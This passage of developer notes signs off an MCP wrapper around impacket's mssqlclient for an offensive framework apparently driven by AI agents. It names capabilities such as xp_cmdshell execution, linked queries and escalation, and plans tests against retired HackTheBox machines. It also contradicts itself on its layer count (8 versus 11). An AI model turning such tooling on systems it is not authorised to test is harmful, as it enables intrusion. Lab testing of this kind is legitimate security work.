  preserves rollback per SKILL #21. Seven legacy methods preserved (query, enum,
  xp_cmdshell, xp_dirtree, linked_query, extract_assembly, escalate).
- **Image**: `ghcr.io/silicon-works/mcp-tools-mssql:latest` — local rebuild
  required to pick up `python3-full` Dockerfile + Kerberos libs. CI rebuild on
  next push.
- **Binary on PATH**: `mssqlclient.py` (pip-installed, NOT via Kali's
  `impacket-scripts` package — this image is INDEPENDENT of the sibling
  `impacket` image). Verified during Read phase against mcp-server.py line 192
  (`cmd = ["mssqlclient.py", target]`).
- **Live-verify pending**: paste S1-S10 into opensploit against an HTB box
  with MSSQL exposed (Querier for retired Windows + AD; Sequel for retired
  Linux + SQL Server Auth). Confirm `-windows-auth` routes correctly for AD
  accounts vs SQL logins, target extraction picks the positional `[domain/]user[:password]@host`,
  failure signatures trip on Login failed / Connection refused / Msg 208.
- **Cleanup**: no legacy split files (`target_extraction_tests.md` /
  `failure_signature_tests.md`) existed; no `__pycache__/` present. Nothing
  to remove beyond the tool.yaml schema bump.
- **Wave 5.2 sign-off**: 10 narrative scenarios authored (S1-S10); 25 happy-path
  + 23 adversarial target-extraction cases (48 total, ≥20 spec); 13 failure-signature
  cases across 8 distinct layers (DNS / TCP / NTLM / SQL auth / Kerberos preauth /
  Kerberos clock / Kerberos SPN / SQL semantic / SQL syntax / xp_cmdshell-disabled /
  argparse — 11 layers exceeds ≥5 spec); 9 open questions captured (≥1 spec).
  Layer-diverse failure_signatures (≥7 distinct layers — 11 actually).

Authored: 2026-04-25 (Wave 5.2 — final tool of Wave 5).
